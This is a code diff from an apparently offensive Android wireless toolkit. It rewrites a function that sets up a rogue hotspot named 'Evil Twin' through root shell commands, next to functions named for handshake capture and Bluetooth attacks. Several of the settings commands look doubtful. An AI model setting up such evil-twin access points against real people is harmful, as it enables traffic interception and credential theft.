@@ -296,27 +296,44 @@ def capture_handshakes(interface):
 
 def create_multiple_aps(interface):
     try:
-        print(f"{Fore.GREEN}[+] Starting AP using Android system...{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] Starting AP on MTK device...{Fore.RESET}")
         
-        # Enable tethering using Android settings
-        os.system("su -c 'settings put global tether_dun_required 0'")
-        os.system("su -c 'svc wifi enable'")
-        time.sleep(1)
+        # MTK-specific commands for Android 13
+        commands = [
+            # Disable WiFi first
+            "su -c 'svc wifi disable'",
+            "su -c 'settings put global wifi_scan_always_enabled 0'",
+            
+            # Enable tethering
+            "su -c 'settings put global tether_dun_required 0'",
+            "su -c 'settings put global tether_supported 1'",
+            
+            # Configure hotspot
+            "su -c 'settings put global wifi_ap_ssid \"Evil Twin\"'",
+            "su -c 'settings put global wifi_ap_passwd \"12345678\"'",
+            "su -c 'settings put global wifi_ap_band 2'",  # 2.4GHz
+            
+            # Enable hotspot using MTK commands
+            "su -c 'am broadcast -a android.intent.action.WIFI_AP_STATE_CHANGED --ei wifi_state 13'",
+            "su -c 'settings put global wifi_ap_state 1'",
+        ]
         
-        # Configure and start hotspot
-        os.system("su -c 'settings put global wifi_hotspot_ssid \"Free WiFi\"'")
-        os.system("su -c 'settings put global wifi_hotspot_password \"12345678\"'")
-        os.system("su -c 'svc wifi enable'")
-        os.system("su -c 'settings put global wifi_hotspot_enabled 1'")
+        for cmd in commands:
+            print(f"{Fore.YELLOW}[*] Running: {cmd}{Fore.RESET}")
+            os.system(cmd)
+            time.sleep(1)
         
-        print(f"{Fore.GREEN}[+] AP Created! SSID: Free WiFi, Password: 12345678{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] AP should be created. Check WiFi settings.{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] SSID: Evil Twin, Password: 12345678{Fore.RESET}")
         
         while True:
             time.sleep(1)
             
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
-        os.system("su -c 'settings put global wifi_hotspot_enabled 0'")
+        os.system("su -c 'settings put global wifi_ap_state 0'")
+        os.system("su -c 'am broadcast -a android.intent.action.WIFI_AP_STATE_CHANGED --ei wifi_state 11'")
+        os.system("su -c 'svc wifi enable'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
